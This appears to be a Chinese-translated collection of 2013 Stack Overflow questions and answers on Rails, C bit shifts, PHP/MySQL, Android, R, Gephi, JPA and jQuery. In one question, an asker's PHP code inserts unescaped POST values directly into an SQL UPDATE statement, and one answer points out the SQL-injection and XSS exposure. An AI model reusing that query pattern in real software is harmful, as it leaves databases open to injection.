    @PostConstruct
    public void init() {
        gp = new GuestPreferences();
        theme = gp.getTheme();
        themes = new TreeMap<String, String>();
        themes.put("Aristo", "aristo");
        themes.put("Black-Tie", "black-tie");
        ...
    }

    public void saveTheme() {
        gp.setTheme(theme);
    } 
```

# ruby-on-rails-3 - 如何在 RESTful Web 服务调用中重定向用户？

> ID：16122509
> 
> 赞同：0
> 
> 时间：2013-04-20T16:19:38.263
> 
> 标签：ruby-on-rails-3, web-services, rest

我有一个 Ruby on Rails 预订 Web 应用程序，它有一个 REST 接口，可以向多个基于 PHP 的客户端网站提供一些 JSON 原始数据。这些操作目前运行良好。

我现在想允许最终用户使用 RESTful Web 服务从客户端网站上预订我的预订系统。我正在寻找像 Paypal 这样的解决方案：

1.  用户点击授权客户网站上的“预订”按钮
2.  用户被重定向到我的应用程序上的预订界面，输入他的个人数据并确认他的预订
3.  交易已保存
4.  用户被重定向回客户端网站

我的问题是：如何重定向用户以完成他的请求以及如何在交易后将他重定向回来？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:25:45.647

您可以`document.referrer`在登录页面上使用来获取用户来自的 URL，并可能将其存储在会话中。预订完成后，您可以将用户发送到相同的 URL。

# c - 如果我们按位移动一个大于其大小的整数会发生什么

> ID：16122512
> 
> 赞同：7
> 
> 时间：2013-04-20T16:19:52.537
> 
> 标签：c, bit-shift

在 Visual Studio 编译以下 C 代码时，结果为 4。

```
void main() { int c = 1; c = c<<34;} 
```

从 Visual Studio 反汇编窗口中看到的汇编代码是

```
shl eax,22h 
```

从汇编中，很容易看出我们正在移位 34。由于这里的整数是 4 字节，从结果中可以明显看出，在机器级别进行了模运算，使其工作为移位 2。

我想知道这种行为是跨平台标准化还是跨平台变化？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-20T16:21:56.700

发生未定义的行为。这是由语言标准标准化的（参见`6.5.7 Bitwise shift operators`1999 年的 C 标准部分）。然而，UB 的可观察效果不是标准化的，并且可能会有所不同。

至于`shl eax, 22h`，移位计数将被 CPU 截断为 5 位（参见文档），这条指令的行为实际上是`shl eax, 2`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-20T16:22:56.737

根据[MSDN 上的这篇文章](http://msdn.microsoft.com/en-us/library/336xbhcz.aspx)：

> 如果移位表达式的右操作数为负数或右操作数大于或等于（提升的）左操作数中的位数，则结果未定义。如果右操作数为零 (0)，则不执行移位操作。

# php - 从下拉列表中调用一个值来更新查询

> ID：16122517
> 
> 赞同：1
> 
> 时间：2013-04-20T16:20:13.037
> 
> 标签：php, mysql

我正在尝试使用下拉列表创建一个页面，我希望用户添加他想要的电影院名称并通过 mysql 查询将其发送到数据库。

现在，这就是我从数据库中获取下拉列表的方法（这部分正在工作）

```
<select name="cinema_id" id="cinemaid">
    <?php
    require('../classes/cinema_class.php');
    $cinemas = cinema::get_cinemas_name(); 
$cinema_id = $cinema['cinema_id'];
$cinema_name = $cinema['cinema_name'];

    foreach($cinemas as $cinema)
    {
        $selected = '';
        if( $cinema['cinema_id'] == $_GET['cinema_id'])
        {
            $selected = 'select="selected"';
        }

        echo "<option {$selected} >
            {$cinema['cinema_name']}
            </option>";
    }
    ?>
</select> 
```

这是要更新的mysql查询

```
<?php
$theaterid=$_POST['theaterid'];
$theatername=$_POST['theatername'];
$cinemaid=$_POST['cinemaid'];
if(empty($theatername)){  
echo  "Theater Name is a must";
}
else{
$update_movie=mysql_query("UPDATE `memoire`.`theater` 
            SET `theater_name`= '$theatername',`cinema_id`= '$cinemaid' //the $theatername is working, i think the $cinemaid is wrong
            WHERE `theater_id`='$theaterid'");
if($update_movie)
{ echo "Add Succesfull";}
else
{ echo "error in registration".mysql_error(); }
}?> 
```

我认为问题是如何调用下拉列表中的值并将其发送到更新

对了，页面打印：error in registrationCannot add or update a child row: a foreign key constraint failed ( `memoire`. `theater`, CONSTRAINT `theater_ibfk_1`FOREIGN KEY ( `cinema_id`) REFERENCES `cinema`( `cinema_id`) ON DELETE CASCADE ON UPDATE CASCADE)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:25:42.513

我认为cinema_id 是当前的cinema_name。更改此行：

```
echo "<option {$selected} > 
```

至

```
echo "<option {$selected} value='{$cinema[cinema_id]}' > 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:44:42.380

我想现在我可以问一个更好的问题。在我的数据库中，我需要添加cinema_id。下拉列表给了我cinema_name ...所以我需要用户选择cinema_name 但我需要将它的cinema_id 添加到更新查询中

谢谢你

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:51:06.023

这个问题与您上面的代码片段无关，而是您如何在数据库中设置外键。您能否发布您在上面引用的表的结构以及电影院表，指出您如何设置参考键？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-20T16:27:22.503

在第一个片段中，在您的 内部，您需要有一个 value 属性。

```
echo "<option value='{$cinema['cinema_id']}' {$selected} >
            {$cinema['cinema_name']}
            </option>"; 
```

这至少会将正确的数据发布到服务器。在第二个片段中，您引用的是 html 选择的 id，而不是名称。你应该使用这个名字。

```
$cinemaid=$_POST['cinema_id']; // notice the underscore 
```

一旦发布，这应该会在服务器上为您提供正确的值。

附带说明一下，您的脚本对[SQL 注入](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&ved=0CDQQFjAA&url=http://en.wikipedia.org/wiki/SQL_injection&ei=mcFyUa7cI4SIqwHx6IGwCw&usg=AFQjCNGcGZNbIk2jM8itxItHrCja7eJ0PQ&sig2=J8dL99OWE9_hf_mUzz_8Wg&bvm=bv.45512109,d.aWM)和[跨站点脚本](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&ved=0CDEQFjAA&url=https://en.wikipedia.org/wiki/Cross-site_scripting&ei=uMFyUYCTEcfGrQHl44Bg&usg=AFQjCNF8gcMuXHACArbxvQ0vCgcPHMWSlg&sig2=z81Xtx350jhz-kTT28kSnA&bvm=bv.45512109,d.aWM)开放。你可能想看看那些。

# java - 制作一个安卓应用程序的欢迎页面

> ID：16122519
> 
> 赞同：0
> 
> 时间：2013-04-20T16:20:35.520
> 
> 标签：java, android, xml

我想制作一个欢迎页面（.xml 文件），仅在用户下载应用程序后第一次显示

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-20T16:22:17.267

为此，您可以使用`SharedPreferences`.

当此活动打开时，将首选项中的值保存为 true。并检查下一次如果它的值如果为假则打开，否则不打开。

在您打开活动之前，请检查它。

```
SharedPreferences sharedPref = getSharedPreferences("data",MODE_PRIVATE);
int number = sharedPref.getInt("isOpened", 0);
if(number == 0) {
    //Open this activity and set this so that next it value is 1 then this conditin will be false.
    SharedPreferences.Editor prefEditor = sharedPref.edit();
    prefEditor.putInt("isOpened",1);
    prefEditor.commit();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:23:03.653

为此，您必须检测应用程序的首次启动。

为此，您可以做一件事。

1.  使用 SharedPreference 存储一个值 first_launch，默认情况下为 true。
2.  启动应用程序后检查值是否是第一次运行 如果 first_lunch 为真，则显示欢迎页面并将其设为假 b。如果 first_lunch false 然后开始你的主要活动

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:26:29.210

最简单的方法是在[SharedPreferences](https://developer.android.com/reference/android/content/SharedPreferences.html)中存储一些东西。

```
public void onCreate(Bundle savedInstaceState){
    super.onCreate(savedInstaceState);

    if(savedInstanceState == null){
        SharedPreferences sp = getSharedPreferences("settings", 0);
        if(sp.getBoolean("old", false))){
            // start the real 1st Activity
            startActivity(new Intent(this, com.example.Activity));
            finish();
        }else{
            sp.edit().putBoolean("old", true).commit();
        }
    }

    // add the use once screen stuff here
} 
```

# python - 如何生成具有精确时刻的样本数据

> ID：16122520
> 
> 赞同：3
> 
> 时间：2013-04-20T16:20:39.380
> 
> 标签：python, r

如何生成准确的数据？

在 R 中，我们可以选择`rnorm`从具有某些特征（例如，mean=0，sd=1）的总体中进行抽样，但是我们如何获得具有*完全*mean=0，sd=1 的数据呢？

这是一个简单的例子。我也会对应用获取精确数据的方法的更通用方法感兴趣（例如，精确相关性为 0.2 的多元数据）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T16:30:24.907

简单地扩展您的结果。在单变量情况下：

```
set.seed(21)
x <- rnorm(1000)
mean(x)
sd(x)
y <- x-mean(x)
y <- y/sd(x)
mean(y)  # within floating point precision of 0
sd(y) 
```

多变量案例涉及更多，但可能。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-20T16:37:19.543

听起来你想要 MASS 包中的 mvrnorm 。

```
sigma <- matrix(c(1.0, 0.0, -0.5,
                  0.0, 1.0,  0.5,
                 -0.5, 0.5,  1.0), 3, byrow = TRUE)
mat <- mvrnorm(10, c(0,0,0), sigma, empirical = TRUE)
cor(mat)
#     [,1]  [,2]  [,3]
#[1,]  1.0   0.0  -0.5
#[2,]  0.0   1.0   0.5
#[3,] -0.5   0.5   1.0 
```

请注意，通过为每个组选择 1 的 SD，我简化了事情，因为协方差将等于相关性，但您可以通过记住相关性是协方差除以 SD 的乘积来概括这一点。

（请注意，当您运行代码时，您可能无法获得准确的值，而是机器精度范围内的值......这是我们所希望的）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-20T16:41:59.633

您可以简单地重新调整数据。

```
n <- 100
x <- rnorm(n)
x <- ( x - mean(x) ) / sd(x)
mean(x)   # 0, up to machine precision
sd(x)     # 1 
```

您还可以使用`ppoints`均匀分布的点（不过，您仍然需要重新缩放）。

```
x <- qnorm( ppoints(n) )
x <- ( x - mean(x) ) / sd(x)
mean(x)
sd(x) 
```

在更高维度，转换有点棘手。如果`x`是高斯向量，均值为 0，方差为单位矩阵，`C %*% x`则为高斯向量，均值为 0，方差矩阵为`V = CC'`。 `C`是 的 Cholesky 变换`V`；它可以看作是（对称，半正定）矩阵的平方根的类似物。

实际上需要其中两个转换：第一个将方差设置为恒等，第二个将其设置为所需值。

```
# Desired variance matrix
V <- matrix( c(1,.2,.2, .2,1,.2, .2,.2,1), 3, 3 )

# Random data
n <- 100
k <- 3
x <- matrix( rnorm(k*n), nc=3 )

# Set the mean to 0, and the variance to the identity
x <- t( t(x) - colMeans(x) )
colMeans(x)   # 0
C1 <- chol(var(x))
x <- x %*% solve(C1)
var(x)   # identity matrix

# Set the variance to the desired value
C2 <- chol(V)
x <- x %*% C2
var(x) - V   # zero 
```

# android - 我正在创建一个服务来读取 SMS 消息，但是当我运行它时出现错误

> ID：16122522
> 
> 赞同：0
> 
> 时间：2013-04-20T16:21:23.590
> 
> 标签：android, eclipse, avd

我得到的错误是“不幸的是，服务已停止工作”，其中服务是我的应用程序的名称。这个问题与我之前的问题类似，但在这里我正在做一些完全不同的事情 - 尝试阅读 SMS 消息。

MainActivity.java

```
public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        Button start, stop;

        start = (Button) findViewById(R.id.Button1);
        stop = (Button) findViewById(R.id.Button2);

        start.setOnClickListener(new View.OnClickListener() {

        @Override

        public void onClick(View v) {

        Intent service = new Intent(MainActivity.this, MyService.class);

        startService(service);

        }

        });

        stop.setOnClickListener(new View.OnClickListener() {

        @Override

          public void onClick(View v) {

        Intent name = new Intent(MainActivity.this, MyService.class);

        stopService(name);

        }

        });

        }

} 
```

我的服务文件 MyService.java：

```
public class MyService extends Service {

    final static String ACTION = "NotifyServiceAction";
    final static String STOP_SERVICE = "";
    final static int RQS_STOP_SERVICE = 1;
    private SMSreceiver  mSMSreceiver;
    private IntentFilter mIntentFilter;
    SMSreceiver notifyServiceReceiver;

    private static final int MY_NOTIFICATION_ID=1;
    private NotificationManager notificationManager;
    private Notification myNotification;
    private final String myBlog = "http://android-er.blogspot.com/";

    @Override
    public IBinder onBind(Intent arg0) {
            return null;
    }

    @Override
    public void onCreate() {
        notifyServiceReceiver = new SMSreceiver ();
        mSMSreceiver = new SMSreceiver();
        mIntentFilter = new IntentFilter();
        mIntentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(mSMSreceiver, mIntentFilter);

        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i("MyService","Service started");
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(ACTION);
        registerReceiver(notifyServiceReceiver, intentFilter);

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        Log.i("MyService","Service destroyed");
        this.unregisterReceiver(mSMSreceiver);
        super.onDestroy();

    }

    private class SMSreceiver extends BroadcastReceiver
    {
        private final String TAG = this.getClass().getSimpleName();

        @Override
        public void onReceive(Context context, Intent intent)
        {
            Bundle extras = intent.getExtras();

            String strMessage = "";

            if ( extras != null )
            {
                Object[] smsextras = (Object[]) extras.get( "pdus" );

                for ( int i = 0; i < smsextras.length; i++ )
                {
                    SmsMessage smsmsg = SmsMessage.createFromPdu((byte[])smsextras[i]);

                    String strMsgBody = smsmsg.getMessageBody().toString();
                    String strMsgSrc = smsmsg.getOriginatingAddress();

                    strMessage += "SMS from " + strMsgSrc + " : " + strMsgBody;                    

                    Log.i(TAG, strMessage);
                }

            }

        }

    }

} 
```

服务清单.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="yash.my.service"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="17" />

        <uses-permission android:name="android.permission.RECEIVE_SMS" />
        <uses-permission android:name="android.permission.SEND_SMS" />
            <uses-permission android:name="android.permission.RECEIVE_SMS" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <receiver android:name="yash.my.service.MyService$SMSreceiver">
    <intent-filter android:priority="999"> 
        <action android:name="android.provider.Telephony.SMS_RECEIVED" /> 
    </intent-filter>
</receiver>
        <activity
            android:name="yash.my.service.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service
            android:name=".MyService"
            android:enabled="true" >
        </service>
    </application>

</manifest> 
```

一旦我向 AVD 发送 SMS，就会显示该错误。我还将发布日志：

```
04-20 16:00:45.555: E/Trace(1085): error opening trace file: No such file or directory (2)
04-20 16:00:46.793: D/gralloc_goldfish(1085): Emulator without GPU emulation detected.
04-20 16:00:50.203: I/MyService(1085): Service started
04-20 16:01:05.933: D/AndroidRuntime(1085): Shutting down VM
04-20 16:01:05.933: W/dalvikvm(1085): threadid=1: thread exiting with uncaught exception (group=0x40a71930)
04-20 16:01:05.943: E/AndroidRuntime(1085): FATAL EXCEPTION: main
04-20 16:01:05.943: E/AndroidRuntime(1085): java.lang.RuntimeException: Unable to instantiate receiver yash.my.service.MyService.SMSreceiver: java.lang.ClassNotFoundException: Didn't find class "yash.my.service.MyService.SMSreceiver" on path: /data/app/yash.my.service-1.apk
04-20 16:01:05.943: E/AndroidRuntime(1085):     at android.app.ActivityThread.handleReceiver(ActivityThread.java:2357)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at android.app.ActivityThread.access$1500(ActivityThread.java:141)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1310)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at android.os.Looper.loop(Looper.java:137)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at android.app.ActivityThread.main(ActivityThread.java:5041)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at java.lang.reflect.Method.invokeNative(Native Method)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at java.lang.reflect.Method.invoke(Method.java:511)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at dalvik.system.NativeStart.main(Native Method)
04-20 16:01:05.943: E/AndroidRuntime(1085): Caused by: java.lang.ClassNotFoundException: Didn't find class "yash.my.service.MyService.SMSreceiver" on path: /data/app/yash.my.service-1.apk
04-20 16:01:05.943: E/AndroidRuntime(1085):     at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:65)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at java.lang.ClassLoader.loadClass(ClassLoader.java:501)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at java.lang.ClassLoader.loadClass(ClassLoader.java:461)
04-20 16:01:05.943: E/AndroidRuntime(1085):     at android.app.ActivityThread.handleReceiver(ActivityThread.java:2352)
04-20 16:01:05.943: E/AndroidRuntime(1085):     ... 10 more
04-20 16:01:06.203: D/dalvikvm(1085): GC_CONCURRENT freed 106K, 8% free 2692K/2916K, paused 75ms+2ms, total 213ms 
```

**更新代码后的新 LOGCAT：**

```
04-20 16:33:41.163: I/MyService(1304): Service started
04-20 16:33:56.355: D/dalvikvm(1304): newInstance failed: no <init>()
04-20 16:33:56.355: D/AndroidRuntime(1304): Shutting down VM
04-20 16:33:56.363: W/dalvikvm(1304): threadid=1: thread exiting with uncaught exception (group=0x40a71930)
04-20 16:33:56.483: E/AndroidRuntime(1304): FATAL EXCEPTION: main
04-20 16:33:56.483: E/AndroidRuntime(1304): java.lang.RuntimeException: Unable to instantiate receiver yash.my.service.MyService$SMSreceiver: java.lang.InstantiationException: can't instantiate class yash.my.service.MyService$SMSreceiver; no empty constructor
04-20 16:33:56.483: E/AndroidRuntime(1304):     at android.app.ActivityThread.handleReceiver(ActivityThread.java:2357)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at android.app.ActivityThread.access$1500(ActivityThread.java:141)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1310)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at android.os.Looper.loop(Looper.java:137)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at android.app.ActivityThread.main(ActivityThread.java:5041)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at java.lang.reflect.Method.invokeNative(Native Method)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at java.lang.reflect.Method.invoke(Method.java:511)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at dalvik.system.NativeStart.main(Native Method)
04-20 16:33:56.483: E/AndroidRuntime(1304): Caused by: java.lang.InstantiationException: can't instantiate class yash.my.service.MyService$SMSreceiver; no empty constructor
04-20 16:33:56.483: E/AndroidRuntime(1304):     at java.lang.Class.newInstanceImpl(Native Method)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at java.lang.Class.newInstance(Class.java:1319)
04-20 16:33:56.483: E/AndroidRuntime(1304):     at android.app.ActivityThread.handleReceiver(ActivityThread.java:2352)
04-20 16:33:56.483: E/AndroidRuntime(1304):     ... 10 more
04-20 16:33:56.613: D/dalvikvm(1304): GC_CONCURRENT freed 119K, 9% free 2692K/2928K, paused 75ms+3ms, total 214ms 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:32:18.047

要在清单中使用内部类，您需要使用 $ 将其与父类分开。

```
com.example.ParentClass$InnerClass 
```

它还需要是公共的和静态的。

# java - Gephi 试图打开一个大的 gml 文件 Java 错误

> ID：16122525
> 
> 赞同：0
> 
> 时间：2013-04-20T16:21:35.747
> 
> 标签：java, file, graph, gephi

我有以下问题：我使用 R 通过导出为图形创建了 ~100 MB 文件（因此我可以在必要时重新导出）我需要在 gephi (0.8.2) 中打开它该文件包括 ~2.6k 节点， ~170k 边，每个节点都有几个属性。

我已将所有属性减少到只有必要的属性，但 Gephi 仍然无法打开。我正在运行一台具有 4 GB 内存的笔记本电脑（我已经关闭了所有不必要的东西）并且我有 Java 64 位。然而，我仍然遇到以下问题：

java.lang.RuntimeException：java.lang.IndexOutOfBoundsException：Index5，大小：5

我不认为这是我以前遇到的内存问题，即使在最有问题的地方，我仍然有足够的（至少约 600 MB）可用内存。配置文件设置为：Xmx2827m

该文件当前导出为 GML，但我可以使用[igraph](http://igraph.sourceforge.net/)可以导出的任何格式。因此，任何允许我在 gephi 中打开文件（包括节点、边和属性）的解决方案都将受到欢迎。我选择 GML 是因为它似乎是支持属性的最小文件格式。

有任何想法吗？

非常感谢您的宝贵时间！

# netbeans - Zend 框架 2 和 netbeans Xdebug 的问题

> ID：16122532
> 
> 赞同：4
> 
> 时间：2013-04-20T16:22:20.740
> 
> 标签：netbeans, zend-framework2, xdebug

您好，我将 xdebug 放在我的 wamp 中，它可以工作。我正在尝试在 zend 框架 2 上使用它。我的问题是，当我设置断点时，我想直接跳转到我的断点。现在我每次到达断点之前都必须传递太多文件。你能给我建议吗？顺便说一句，我在 Windows 7 上使用 netbeans 7.3

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-17T11:30:29.613

在我的场景（Linux + Netbeans 7.3）中，我单击**F5**（继续）转到下一个断点。

# jpa - JPA 测试类 UnsupportedClassVersionError

> ID：16122533
> 
> 赞同：0
> 
> 时间：2013-04-20T16:22:22.287
> 
> 标签：jpa, junit

我在这里运行示例：

[https://schuchert.wikispaces.com/JPA+Tutorial+1+-+Getting+Started](https://schuchert.wikispaces.com/JPA+Tutorial+1+-+Getting+Started)

该示例包含一个测试类：

```
package entity;

import javax.persistence.EntityManager;
import javax.persistence.EntityManagerFactory;
import javax.persistence.Persistence;

import org.apache.log4j.BasicConfigurator;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;

public class PersistanceTest {
    private EntityManagerFactory emf;

    private EntityManager em;

    @Before
    public void initEmfAndEm() {
        BasicConfigurator.configure();

        emf = Persistence.createEntityManagerFactory("examplePersistenceUnit");
        em = emf.createEntityManager();
    }

    @After
    public void cleanup() {
        em.close();
    }

    @Test
    public void emptyTest() {
    }
} 
```

我在这一行遇到错误：

emf = Persistence.createEntityManagerFactory("examplePersistenceUnit");

错误是：

```
java.lang.UnsupportedClassVersionError: Bad version number in .class file
    at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClass(ClassLoader.java:620)
    at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:124)
    at java.net.URLClassLoader.defineClass(URLClassLoader.java:260)
    at java.net.URLClassLoader.access$100(URLClassLoader.java:56)
    at java.net.URLClassLoader$1.run(URLClassLoader.java:195)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:188)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:268)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:251)
    at javax.persistence.spi.PersistenceProviderResolverHolder$PersistenceProviderResolverPerClassLoader$CachingPersistenceProviderResolver.loadResolverClasses(PersistenceProviderResolverHolder.java:150)
    at javax.persistence.spi.PersistenceProviderResolverHolder$PersistenceProviderResolverPerClassLoader$CachingPersistenceProviderResolver.<init>(PersistenceProviderResolverHolder.java:130)
    at javax.persistence.spi.PersistenceProviderResolverHolder$PersistenceProviderResolverPerClassLoader.getPersistenceProviders(PersistenceProviderResolverHolder.java:88)
    at javax.persistence.Persistence.getProviders(Persistence.java:75)
    at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:61)
    at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:47)
    at entity.PersistanceTest.initEmfAndEm(PersistanceTest.java:24)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:585)
    at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:45)
    at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
    at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:42)
    at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:27)
    at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:30)
    at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:263)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:68)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:47)
    at org.junit.runners.ParentRunner$3.run(ParentRunner.java:231)
    at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:60)
    at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:229)
    at org.junit.runners.ParentRunner.access$000(ParentRunner.java:50)
    at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:222)
    at org.junit.runners.ParentRunner.run(ParentRunner.java:300)
    at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50)
    at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197) 
```

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-01T17:41:21.750

升级到最新的[JDK](http://www.oracle.com/technetwork/java/javase/downloads/index.html)，我认为问题将得到解决。

# javascript - 页面加载后（加载所有站点图像后）如何完全加载正文背景图像？

> ID：16122537
> 
> 赞同：1
> 
> 时间：2013-04-20T16:22:51.917
> 
> 标签：javascript, jquery, css

我想为我的网站加载正文背景图片。它非常大，因此加载我的页面需要很长时间。所以我想在页面完全加载后加载正文背景图像。

我尝试了javascript `window.onload`，但没有帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-20T16:27:51.363

如果你使用 jQuery，你可以这样做（[http://api.jquery.com/ready/](http://api.jquery.com/ready/)）：

JS：

```
$(document).ready(function() {
    $('body').addClass('large-background');
}); 
```

CSS：

```
.large-background {
    background: url('../img/large-image.jpg') no-repeat;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:27:14.383

尝试这样的事情 - 首先从图像中删除 src 属性：

```
$(function() {
   $('img#bg').attr('src', 'images/myImage.jpg');
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-02-09T10:29:01.460

将正文背景放在页面末尾的样式标记中。

```
<style type='text/css'>body{background-image:url("/images/bgimage.gif")}</style> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-10-27T21:46:07.503

我用 Jquery 为我的轮播制作了一个脚本：

1.  计算所有具有类 [classname] 的 div

2.  获取每个div data-src

3.  为每个 div 设置 - 样式（背景）

    ```
    $(document).ready(function(){
       var numBackground = $('.main-view-carosel').length /*amount of divs with 
       class*/
       console.log(numBackground);/*view the lenth*/

        setTimeout(function(){ /*set time out if needs to see ho it works*/

           for (let i = 0; i < numBackground; i++ ){ /*set the maximal [i] 
              amount of existing elements*/
              var elements = document.getElementsByClassName('main-view- 
              carosel');//get el with needed classname
              var requiredElement = elements[i]; /*get first one, second, third, 
              etc [i]*/
              var image = $(requiredElement).attr("data-src")/*get this div 
              data-src*/
              console.log(image);/*view in console this data-src*/
              requiredElement.style.backgroundImage = "url(" + image + ")";/*set 
              background for current div*/
           }
        }, 100);
    }); 
    ```

# php - 这可以在 PHP 中完成吗？简单的 abc“游戏”

> ID：16122542
> 
> 赞同：-6
> 
> 时间：2013-04-20T16:23:11.410
> 
> 标签：php

我需要构建以下... 3个主要功能...

1 页，26 个盒子。每个盒子都有一张动物的照片。

2-当单击动物时，加载显示该动物的新页面。屏幕上还有3个字母。用户必须选择正确的动物首字母。

3- 返回第一页，但显示字母代替动物照片。

我不是要求任何人对此进行编码，只需要大致了解是否可以这样做。另外，我可以查找哪些类型的函数。

谢谢你，哈利

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:26:20.073

是的，这绝对可以做到。查找 cookie 和 $_GET 变量。（也就是说，假设您已经可以使用其他语言进行编码。）

如果你不会编码，那么这会有点困难，但如果你愿意花时间学习的话，这仍然是绝对可行的。

[http://www.codecademy.com/](http://www.codecademy.com/)有一门关于 PHP 的课程，我认为这对初学者来说非常棒，您应该立即启动并运行这个应用程序。

# php - 如何创建从数据库中动态提取的静态 WordPress 页面？

> ID：16122546
> 
> 赞同：3
> 
> 时间：2013-04-20T16:23:30.787
> 
> 标签：php, database, wordpress, dynamic, static

我在 MySQL 数据库中有一堆由自动递增`id`值索引的数据。

一行看起来像这样：

```
id | title                           | description                       | story
1  | A good day in the neighborhood. | Mr. Rogers is in the neighborhood | A long text wall here... 
```

